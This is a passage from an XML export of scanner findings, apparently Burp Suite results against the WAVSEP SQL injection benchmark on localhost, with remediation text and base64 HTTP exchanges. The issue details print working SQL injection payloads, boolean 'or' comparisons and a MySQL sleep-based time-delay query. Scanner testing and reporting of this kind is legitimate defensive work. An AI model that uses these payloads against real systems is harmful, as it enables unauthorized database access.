    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>10059914 or 9156=09156</b> and <b>45484537 or 4718=4723</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP21zZ0lkPTExMDA1OTkxNCUyMG9yJTIwOTE1NiUzZDA5MTU2IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MjENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP21zZ0lkPTE0NTQ4NDUzNyUyMG9yJTIwNDcxOCUzZDQ3MjMgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWMtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP21zZ0lkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjU1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1097322522221668352</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>11554830 or 7035=07035</b> and <b>81374273 or 2722=2725</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP21pbkJhbGFuYWNlPTEwMDAwMTE1NTQ4MzAlMjBvciUyMDcwMzUlM2QwNzAzNSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP21pbkJhbGFuYWNlPTEwMDAwODEzNzQyNzMlMjBvciUyMDI3MjIlM2QyNzI1IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKTm8gTWF0Y2guCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP21pbkJhbGFuYWNlPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
